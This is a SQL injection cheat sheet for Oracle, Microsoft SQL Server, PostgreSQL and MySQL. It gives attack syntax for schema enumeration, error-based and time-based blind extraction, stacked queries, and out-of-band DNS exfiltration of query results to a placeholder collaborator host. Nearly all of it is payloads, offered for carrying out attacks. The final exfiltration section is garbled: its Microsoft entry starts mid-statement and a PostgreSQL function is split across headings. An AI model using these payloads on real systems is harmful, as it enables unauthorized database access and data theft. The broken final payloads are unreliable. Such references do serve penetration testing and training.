# SQL Injection Cheat Sheet 📌

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

---

## String Concatenation
You can concatenate together multiple strings to make a single string.

Oracle  
`'foo'||'bar'`

Microsoft  
`'foo'+'bar'`

PostgreSQL  
`'foo'||'bar'`

MySQL  
`'foo' 'bar'` [Note the space between the two strings]  
`CONCAT('foo','bar')`

---

## Substring
You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based.

Oracle  
`SUBSTR('foobar', 4, 2)`

Microsoft  
`SUBSTRING('foobar', 4, 2)`

PostgreSQL  
`SUBSTRING('foobar', 4, 2)`

MySQL  
`SUBSTRING('foobar', 4, 2)`

---

## Comments
You can use comments to truncate a query and remove the portion of the original query that follows your input.

Oracle  
`--comment`

Microsoft  
`--comment`  
`/*comment*/`

PostgreSQL  
`--comment`  
`/*comment*/`

MySQL  
`#comment`  
`-- comment` [Note the space after --]  
`/*comment*/`

---

## Database Version
You can query the database to determine its type and version.

Oracle  
`SELECT banner FROM v$version`  
`SELECT version FROM v$instance`

Microsoft  
`SELECT @@version`

PostgreSQL  
`SELECT version()`

MySQL  
`SELECT @@version`

---

## Database Contents
You can list tables and columns in the database.

Oracle  
`SELECT * FROM all_tables`  
`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`

Microsoft  
`SELECT * FROM information_schema.tables`  
`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

PostgreSQL  
`SELECT * FROM information_schema.tables`  
`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

MySQL  
`SELECT * FROM information_schema.tables`  
`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

---

## Conditional Errors
Test a boolean condition and trigger an error if true.

Oracle  
`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`

Microsoft  
`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`

PostgreSQL  
`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`

MySQL  
`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

---

## Extracting Data via Visible Errors

Microsoft  

SELECT 'foo' WHERE 1 = (SELECT 'secret')
> Conversion failed when converting the varchar value 'secret' to data type int.


PostgreSQL  

SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
> invalid input syntax for integer: "secret"


MySQL  

SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
> XPATH syntax error: '\secret'


---

## Batched (Stacked) Queries

Oracle  
Not supported

Microsoft  
`QUERY-1-HERE; QUERY-2-HERE
QUERY-1-HERE QUERY-2-HERE`

PostgreSQL  
`QUERY-1-HERE; QUERY-2-HERE`

MySQL  
`QUERY-1-HERE; QUERY-2-HERE`

Note: MySQL stacked queries may not always work depending on API.

---

## Time Delays

Oracle  
`dbms_pipe.receive_message(('a'),10)`

Microsoft  
`WAITFOR DELAY '0:0:10'`

PostgreSQL  
`SELECT pg_sleep(10)`

MySQL  
`SELECT SLEEP(10)`

---

## Conditional Time Delays

Oracle  
`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`

Microsoft  
`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`

PostgreSQL  
`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`

MySQL  
`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`

---

## DNS Lookup
DNS Lookup

Oracle  

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

### technique works on fully patched Oracle installations, but requires elevated privileges:

Microsoft  
`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`

PostgreSQL  
`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`

MySQL (Windows only)  
`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`

---

## DNS Lookup with Data Exfiltration

Oracle  
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual


Microsoft  

HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin

PostgreSQL  

c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
